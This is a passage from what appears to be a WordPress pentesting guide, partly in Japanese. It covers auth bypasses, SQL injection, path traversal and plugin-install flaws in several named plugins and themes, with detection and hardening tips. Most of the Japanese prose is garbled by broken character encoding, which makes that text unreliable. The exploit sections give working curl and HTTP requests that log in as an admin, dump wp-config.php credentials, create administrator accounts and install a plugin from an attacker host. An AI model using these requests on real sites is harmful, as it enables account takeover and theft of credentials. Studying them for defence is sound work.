ä¸€éƒ¨ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¹ã‚¤ãƒƒãƒãƒ³ã‚°ç”¨ã®ãƒ˜ãƒ«ãƒ‘ãƒ¼ã‚’å…¬é–‹ã® `init` ãƒ•ãƒƒã‚¯ã«æ¥ç¶šã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒåˆ¶å¾¡ã™ã‚‹Cookieã‹ã‚‰è­˜åˆ¥æƒ…å ±ã‚’å–å¾—ã—ã¾ã™ã€‚ã‚³ãƒ¼ãƒ‰ãŒèªè¨¼ã€æ¨©é™ã€æœ‰åŠ¹ãªnonceã®æ¤œè¨¼ã‚’è¡Œã‚ãšã« `wp_set_auth_cookie()` ã‚’å‘¼ã³å‡ºã™ã¨ã€æœªèªè¨¼ã®è¨ªå•è€…ãŒä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã¨ã—ã¦å¼·åˆ¶çš„ã«ãƒ­ã‚°ã‚¤ãƒ³ã§ãã¾ã™ã€‚

Typical vulnerable pattern (simplified from Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- å…¬é–‹ã® `init` ãƒ•ãƒƒã‚¯ã«ã‚ˆã‚Šãƒãƒ³ãƒ‰ãƒ©ã¯æœªèªè¨¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰åˆ°é”å¯èƒ½ã«ãªã‚‹ï¼ˆ`is_user_logged_in()` ã‚¬ãƒ¼ãƒ‰ãŒãªã„ï¼‰ã€‚
- è­˜åˆ¥ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒå¤‰æ›´å¯èƒ½ãªã‚¯ãƒƒã‚­ãƒ¼ï¼ˆ`original_user_id`ï¼‰ã‹ã‚‰å°å‡ºã•ã‚Œã¦ã„ã‚‹ã€‚
- `wp_set_auth_cookie($uid)` ã‚’ç›´æ¥å‘¼ã³å‡ºã™ã“ã¨ã§ã€è¦æ±‚è€…ã‚’ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã•ã›ã‚‹ï¼ˆæ¨©é™ã‚„ nonce ãƒã‚§ãƒƒã‚¯ãªã—ï¼‰ã€‚

æ‚ªç”¨ï¼ˆæœªèªè¨¼ï¼‰
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF â€” WordPress/plugin CVEs ã®è€ƒæ…®äº‹é …

ä¸€èˆ¬çš„ãªã‚¨ãƒƒã‚¸/ã‚µãƒ¼ãƒãƒ¼ WAF ã¯åºƒç¯„ãªãƒ‘ã‚¿ãƒ¼ãƒ³ï¼ˆSQLiã€XSSã€LFIï¼‰ã«åˆã‚ã›ã¦ãƒãƒ¥ãƒ¼ãƒ‹ãƒ³ã‚°ã•ã‚Œã¦ã„ã¾ã™ã€‚å¤šãã®é«˜å½±éŸ¿ãª WordPress/plugin ã®è„†å¼±æ€§ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å›ºæœ‰ã®ãƒ­ã‚¸ãƒƒã‚¯ã‚„ auth ãƒã‚°ã§ã€ã‚¨ãƒ³ã‚¸ãƒ³ãŒ WordPress ã®ãƒ«ãƒ¼ãƒˆã‚„ plugin ã®ã‚»ãƒãƒ³ãƒ†ã‚£ã‚¯ã‚¹ã‚’ç†è§£ã—ã¦ã„ãªã„ã¨æ­£å½“ãªãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã«è¦‹ãˆã¦ã—ã¾ã„ã¾ã™ã€‚

æ”»æ’ƒå´ã®æ³¨æ„ç‚¹

- plugin å°‚ç”¨ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ã‚¯ãƒªãƒ¼ãƒ³ãª payloads ã§ç‹™ã†: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- ã¾ãšã¯ unauth ãƒ‘ã‚¹ã‚’è©¦ã™ï¼ˆAJAX `nopriv`ã€ãƒ‘ãƒ¼ãƒŸãƒƒã‚·ãƒ–ãª `permission_callback` ã‚’æŒã¤ RESTã€public shortcodesï¼‰ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã® payloads ã¯é›£èª­åŒ–ãªã—ã§æˆåŠŸã™ã‚‹ã“ã¨ãŒå¤šã„ã€‚
- å…¸å‹çš„ãªé«˜å½±éŸ¿ã‚±ãƒ¼ã‚¹: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

é˜²å¾¡å´ã®æ³¨æ„ç‚¹

- plugin CVEs ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«æ±ç”¨çš„ãª WAF ã‚·ã‚°ãƒãƒãƒ£ã«é ¼ã‚‰ãªã„ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å±¤ã§è„†å¼±æ€§å›ºæœ‰ã®ä»®æƒ³ãƒ‘ãƒƒãƒã‚’å®Ÿè£…ã™ã‚‹ã‹ã€ç´ æ—©ãæ›´æ–°ã™ã‚‹ã€‚
- ã‚³ãƒ¼ãƒ‰å†…ã§ã¯ãƒã‚¬ãƒ†ã‚£ãƒ–ãª regex ãƒ•ã‚£ãƒ«ã‚¿ã‚ˆã‚Šã‚‚ã€ãƒã‚¸ãƒ†ã‚£ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚§ãƒƒã‚¯ï¼ˆcapabilitiesã€noncesã€å³æ ¼ãªå…¥åŠ›æ¤œè¨¼ï¼‰ã‚’å„ªå…ˆã™ã‚‹ã€‚

## WordPress ã®ä¿è­·

### å®šæœŸçš„ãªæ›´æ–°

WordPressã€pluginsã€themes ãŒæœ€æ–°ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ã€‚ã¾ãŸã€`wp-config.php` ã§è‡ªå‹•æ›´æ–°ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ã‹ç¢ºèªã™ã‚‹:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ã¾ãŸã€**ä¿¡é ¼ã§ãã‚‹ WordPress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒã®ã¿ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ãã ã•ã„**ã€‚

### ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ—ãƒ©ã‚°ã‚¤ãƒ³

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ãã®ä»–ã®æ¨å¥¨äº‹é …**

- ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã® **admin** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å‰Šé™¤ã™ã‚‹
- **å¼·åŠ›ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰** ã¨ **2FA** ã‚’ä½¿ç”¨ã™ã‚‹
- å®šæœŸçš„ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã® **æ¨©é™** ã‚’ **è¦‹ç›´ã™**
- **ãƒ­ã‚°ã‚¤ãƒ³è©¦è¡Œå›æ•°ã‚’åˆ¶é™ã™ã‚‹**ã“ã¨ã§ Brute Force æ”»æ’ƒã‚’é˜²ã
- **`wp-admin.php`** ãƒ•ã‚¡ã‚¤ãƒ«ã®åå‰ã‚’å¤‰æ›´ã—ã€å†…éƒ¨ã¾ãŸã¯ç‰¹å®šã® IP ã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã€‚


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal ã®æ±‚äººãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ **savecategory** ã‚¿ã‚¹ã‚¯ã‚’å…¬é–‹ã—ã¦ãŠã‚Šã€æœ€çµ‚çš„ã« `modules/category/model.php::validateFormData()` å†…ã§ä»¥ä¸‹ã®è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
ã“ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆãŒå¼•ãèµ·ã“ã™å•é¡Œ:

1. **Unsanitised user input** â€“ `parentid` ã¯HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã‚‰ãã®ã¾ã¾å–å¾—ã•ã‚Œã¦ã„ã¾ã™ã€‚
2. **String concatenation inside the WHERE clause** â€“ `is_numeric()` / `esc_sql()` / prepared statement ãŒä½¿ã‚ã‚Œã¦ã„ã¾ã›ã‚“ã€‚
3. **Unauthenticated reachability** â€“ ã“ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ `admin-post.php` ã‚’é€šã˜ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ãŒã€è¨­ç½®ã•ã‚Œã¦ã„ã‚‹å”¯ä¸€ã®ãƒã‚§ãƒƒã‚¯ã¯ **CSRF nonce** (`wp_verify_nonce()`) ã§ã€ã“ã‚Œã¯ã‚·ãƒ§ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰ `[wpjobportal_my_resumes]` ã‚’åŸ‹ã‚è¾¼ã‚“ã å…¬é–‹ãƒšãƒ¼ã‚¸ã‹ã‚‰èª°ã§ã‚‚å–å¾—ã§ãã¾ã™ã€‚

#### æ‚ªç”¨

1. æ–°ã—ã„ nonce ã‚’å–å¾—ã™ã‚‹:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` ã‚’æ‚ªç”¨ã—ã¦ä»»æ„ã®SQLã‚’æ³¨å…¥ã™ã‚‹:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯æ³¨å…¥ã•ã‚ŒãŸã‚¯ã‚¨ãƒªã®çµæœã‚’è¡¨ç¤ºã™ã‚‹ã‹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’å¤‰æ›´ã—ã€SQLi ã‚’è¨¼æ˜ã—ã¾ã™ã€‚


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

åˆ¥ã®ã‚¿ã‚¹ã‚¯ã€**downloadcustomfile** ã¯ã€path traversal ã‚’ä»‹ã—ã¦è¨ªå•è€…ãŒãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã®**ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«**ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹ã‚ˆã†ã«ã—ã¦ã„ã¾ã—ãŸã€‚è„†å¼±ãªã‚·ãƒ³ã‚¯ã¯ `modules/customfield/model.php::downloadCustomUploadedFile()` ã«ã‚ã‚Šã¾ã™ï¼š
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ã¯æ”»æ’ƒè€…ãŒåˆ¶å¾¡å¯èƒ½ã§ã€**without sanitisation** ã®ã¾ã¾é€£çµã•ã‚Œã¦ã„ã¾ã™ã€‚ç¹°ã‚Šè¿”ã—ã¾ã™ãŒã€å”¯ä¸€ã®éšœå£ã¯å±¥æ­´æ›¸ãƒšãƒ¼ã‚¸ã‹ã‚‰å–å¾—ã§ãã‚‹ **CSRF nonce** ã§ã™ã€‚

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ã‚µãƒ¼ãƒãƒ¼ã¯ `wp-config.php` ã®å†…å®¹ã‚’è¿”ã—ã€leaking DB credentials and auth keysã€‚

## æœªèªè¨¼ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆä¹—ã£å–ã‚Š â€” Social Login AJAX fallback çµŒç”± (Jobmonster Theme <= 4.7.9)

å¤šãã®ãƒ†ãƒ¼ãƒ/ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ admin-ajax.php çµŒç”±ã§å…¬é–‹ã•ã‚Œã‚‹ "social login" ãƒ˜ãƒ«ãƒ‘ãƒ¼ã‚’æä¾›ã—ã¾ã™ã€‚æœªèªè¨¼ã® AJAX ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ (wp_ajax_nopriv_...) ãŒ provider data ãŒå­˜åœ¨ã—ãªã„å ´åˆã« client-supplied identifiers ã‚’ä¿¡ç”¨ã—ã¦ wp_set_auth_cookie() ã‚’å‘¼ã³å‡ºã™ã¨ã€å®Œå…¨ãª full authentication bypass ã«ãªã‚Šã¾ã™ã€‚

å…¸å‹çš„ãªæ¬ é™¥ãƒ‘ã‚¿ãƒ¼ãƒ³ï¼ˆç°¡ç•¥åŒ–ï¼‰
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- admin-ajax.phpï¼ˆwp_ajax_nopriv_â€¦ ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ï¼‰çµŒç”±ã§æœªèªè¨¼ã§åˆ°é”å¯èƒ½ã€‚
- çŠ¶æ…‹å¤‰æ›´å‰ã« nonce/capability ãƒã‚§ãƒƒã‚¯ãŒè¡Œã‚ã‚Œãªã„ã€‚
- OAuth/OpenID provider ã®æ¤œè¨¼ãŒæ¬ å¦‚ã—ã¦ãŠã‚Šã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åˆ†å²ãŒæ”»æ’ƒè€…ã®å…¥åŠ›ã‚’å—ã‘å…¥ã‚Œã‚‹ã€‚
- get_user_by('email', $_POST['id']) ã®å¾Œã« wp_set_auth_cookie($uid) ãŒå‘¼ã°ã‚Œã€è¦æ±‚è€…ã‚’ä»»æ„ã®æ—¢å­˜ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ã—ã¦èªè¨¼ã—ã¦ã—ã¾ã†ã€‚

æ‚ªç”¨ï¼ˆæœªèªè¨¼ï¼‰

- å‰ææ¡ä»¶: æ”»æ’ƒè€…ãŒ /wp-admin/admin-ajax.php ã«åˆ°é”ã§ãã€æœ‰åŠ¹ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ¡ãƒ¼ãƒ«ã‚’çŸ¥ã£ã¦ã„ã‚‹ã‹æ¨æ¸¬ã§ãã‚‹ã“ã¨ã€‚
- provider ã‚’ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ãªã„å€¤ã«è¨­å®šã™ã‚‹ï¼ˆã¾ãŸã¯çœç•¥ã™ã‚‹ï¼‰ã¨ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åˆ†å²ãŒå®Ÿè¡Œã•ã‚Œã€id=<victim_email> ã‚’æ¸¡ã™ã€‚
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- ãƒ†ãƒ¼ãƒ/ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã® social login ã‚³ãƒ¼ãƒ‰ï¼ˆä¾‹: framework/add-ons/social-login/class-social-login.phpï¼‰ã§ add_action('wp_ajax_nopriv_...', '...') ã®ç™»éŒ²ã‚’ç¢ºèªã™ã‚‹ã€‚
- AJAX ãƒãƒ³ãƒ‰ãƒ©å†…ã§ wp_set_auth_cookie(), get_user_by('email', ...) ã‚’ grep ã™ã‚‹ã€‚

Detection checklist

- social-login ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¨ id=<email> ã‚’å«ã‚€æœªèªè¨¼ã® POST ãŒ /wp-admin/admin-ajax.php ã«å¯¾ã—ã¦è¡Œã‚ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã™ Web ãƒ­ã‚°ã€‚
- åŒä¸€ IP/UA ã‹ã‚‰ã®èªè¨¼æ¸ˆã¿ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ç›´å‰ã« success JSON ã‚’è¿”ã™ 200 ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒã‚ã‚‹ã“ã¨ã€‚

Hardening

- ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå…¥åŠ›ã‹ã‚‰è­˜åˆ¥ã‚’å°å‡ºã—ãªã„ã€‚ãƒ¡ãƒ¼ãƒ«/ID ã¯æ¤œè¨¼æ¸ˆã¿ãƒ—ãƒ­ãƒã‚¤ãƒ€ã®ãƒˆãƒ¼ã‚¯ãƒ³/ID ã«ç”±æ¥ã™ã‚‹ã‚‚ã®ã®ã¿å—ã‘å…¥ã‚Œã‚‹ã€‚
- ãƒ­ã‚°ã‚¤ãƒ³è£œåŠ©ã§ã‚‚ CSRF nonce ã¨ capability ãƒã‚§ãƒƒã‚¯ã‚’è¦æ±‚ã™ã‚‹ã€‚wp_ajax_nopriv_ ã®ç™»éŒ²ã¯æœ¬å½“ã«å¿…è¦ãªå ´åˆã®ã¿è¡Œã†ã€‚
- OAuth/OIDC ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’ã‚µãƒ¼ãƒãƒ¼å´ã§æ¤œè¨¼ãƒ»ç¢ºèªã™ã‚‹ã€‚ãƒ—ãƒ­ãƒã‚¤ãƒ€ãŒæ¬ è½ãƒ»ç„¡åŠ¹ãªå ´åˆã¯æ‹’å¦ã™ã‚‹ï¼ˆPOST ã® id ã«ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã—ãªã„ï¼‰ã€‚
- ä¿®æ­£ã•ã‚Œã‚‹ã¾ã§ä¸€æ™‚çš„ã« social login ã‚’ç„¡åŠ¹åŒ–ã™ã‚‹ã‹ã€ã‚¨ãƒƒã‚¸ã§è„†å¼±ãª action ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã—ã¦ä»®ãƒ‘ãƒƒãƒã‚’å½“ã¦ã‚‹ã“ã¨ã‚’æ¤œè¨ã™ã‚‹ã€‚

Patched behaviour (Jobmonster 4.8.0)

- $_POST['id'] ã‹ã‚‰ã®å®‰å…¨ã§ãªã„ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã‚’å‰Šé™¤ï¼›$user_email ã¯ switch($_POST['using']) ã®æ¤œè¨¼æ¸ˆã¿ãƒ—ãƒ­ãƒã‚¤ãƒ€åˆ†å²ã‹ã‚‰ã®ã¿å–å¾—ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚‹ã€‚

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

ä¸€éƒ¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã€å‘¼ã³å‡ºã—å…ƒã® capability ã‚’æ¤œè¨¼ã›ãšã«å†åˆ©ç”¨å¯èƒ½ãª â€œconnection keysâ€ ã‚„ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç™ºè¡Œã™ã‚‹ REST ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å…¬é–‹ã—ã¦ã„ã‚‹ã€‚ãƒ«ãƒ¼ãƒˆãŒæ¨æ¸¬å¯èƒ½ãªå±æ€§ï¼ˆä¾‹: usernameï¼‰ã®ã¿ã§èªè¨¼ã—ã€ã‚­ãƒ¼ã‚’ capability ãƒã‚§ãƒƒã‚¯ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼/ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ç´ä»˜ã‘ãªã„å ´åˆã€æœªèªè¨¼ã®æ”»æ’ƒè€…ãŒã‚­ãƒ¼ã‚’ç™ºè¡Œã—ã¦ç‰¹æ¨©æ“ä½œï¼ˆç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆä½œæˆã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³æ“ä½œ â†’ RCEï¼‰ã‚’å®Ÿè¡Œã§ãã‚‹ã€‚

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Why itâ€™s exploitable
- Sensitive REST route protected only by low-entropy identity proof (username) or missing permission_callback
- No capability enforcement; minted key is accepted as a universal bypass

Detection checklist
- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚³ãƒ¼ãƒ‰ã‚’ grep ã—ã¦ register_rest_route(..., [ 'permission_callback' => '__return_true' ]) ã‚’æ¢ã™
- èªè¨¼æ¸ˆã¿ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ capability ã«ç´ã¥ã‘ã‚‰ã‚Œãšã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆæä¾›ã®è­˜åˆ¥æƒ…å ±ï¼ˆusername/emailï¼‰ã«åŸºã¥ã„ã¦ãƒˆãƒ¼ã‚¯ãƒ³/ã‚­ãƒ¼ã‚’ç™ºè¡Œã™ã‚‹ãƒ«ãƒ¼ãƒˆ
- ã‚µãƒ¼ãƒãƒ¼å´ã® capability ãƒã‚§ãƒƒã‚¯ãªã—ã«ç”Ÿæˆã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³/ã‚­ãƒ¼ã‚’å—ã‘å…¥ã‚Œã‚‹å¾Œç¶šã®ãƒ«ãƒ¼ãƒˆã‚’æ¢ã™

Hardening
- ç‰¹æ¨©ã‚’è¦ã™ã‚‹ REST route ã§ã¯ã€å¿…è¦ãª capability ã«å¯¾ã—ã¦ current_user_can() ã‚’å¼·åˆ¶ã™ã‚‹ permission_callback ã‚’å¿…é ˆã«ã™ã‚‹
- ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆæä¾›ã®è­˜åˆ¥æƒ…å ±ã‹ã‚‰é•·æœŸé–“æœ‰åŠ¹ãªã‚­ãƒ¼ã‚’ç™ºè¡Œã—ãªã„ã€‚å¿…è¦ãªå ´åˆã¯èªè¨¼å¾Œã«çŸ­å‘½ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ç´ã¥ããƒˆãƒ¼ã‚¯ãƒ³ã‚’ç™ºè¡Œã—ã€ä½¿ç”¨æ™‚ã«å†åº¦ capability ã‚’ç¢ºèªã™ã‚‹
- å‘¼ã³å‡ºã—å…ƒã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’æ¤œè¨¼ã™ã‚‹ï¼ˆwp_set_current_user å˜ç‹¬ã§ã¯ä¸ååˆ†ï¼‰ã—ã€!is_user_logged_in() || !current_user_can(<cap>) ã®å ´åˆã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ‹’å¦ã™ã‚‹

---

## Nonce gate misuse â†’ unauthenticated arbitrary plugin installation (FunnelKit Automations â‰¤ 3.5.3)

Nonces prevent CSRF, not authorization. If code treats a nonce pass as a green light and then skips capability checks for privileged operations (e.g., install/activate plugins), unauthenticated attackers can meet a weak nonce requirement and reach RCE by installing a backdoored or vulnerable plugin.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX ãƒãƒ³ãƒ‰ãƒ©ã§ã€plugins/themes ã‚’å¤‰æ›´ã—ã€wp_verify_nonce()/check_admin_referer() ã®ã¿ã‚’ä½¿ã£ã¦ã„ã¦æ¨©é™ãƒã‚§ãƒƒã‚¯ãŒãªã„ã‚‚ã®
- nonce æ¤œè¨¼å¾Œã« $skip_caps = true ã‚’è¨­å®šã™ã‚‹ã‚³ãƒ¼ãƒ‰ãƒ‘ã‚¹

Hardening
- nonce ã‚’ CSRF ãƒˆãƒ¼ã‚¯ãƒ³ã¨ã—ã¦ã®ã¿æ‰±ã„ã€nonce ã®çŠ¶æ…‹ã«é–¢ã‚ã‚‰ãšæ¨©é™ãƒã‚§ãƒƒã‚¯ã‚’å¿…ãšå®Ÿæ–½ã™ã‚‹
- installer code ã«åˆ°é”ã™ã‚‹å‰ã« current_user_can('install_plugins') ã¨ current_user_can('activate_plugins') ã‚’è¦æ±‚ã™ã‚‹
- æœªèªè¨¼ã‚¢ã‚¯ã‚»ã‚¹ã‚’æ‹’å¦ã—ã€æ¨©é™ãŒå¿…è¦ãªãƒ•ãƒ­ãƒ¼ã«å¯¾ã—ã¦ nopriv ã® AJAX ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å…¬é–‹ã—ãªã„

### Subscriber+ AJAX plugin installer â†’ forced malicious activation (Motors Theme â‰¤ 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/) showed how the Motors theme ships an authenticated AJAX helper for installing its companion plugin:
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- Only `check_ajax_referer()` is called; there is no `current_user_can('install_plugins')` or `current_user_can('activate_plugins')`.
- The nonce is embedded in the Motors admin page, so any Subscriber that can open `/wp-admin/` can copy it from the HTML/JS.
- The handler trusts the attacker-controlled `plugin` parameter (read from `$_GET`) and passes it into `Plugin_Upgrader::install()`, so an arbitrary remote ZIP is downloaded into `wp-content/plugins/`.
- After installation the theme unconditionally calls `mvl_theme_activate_plugin()`, guaranteeing execution of the attacker plugin's PHP code.

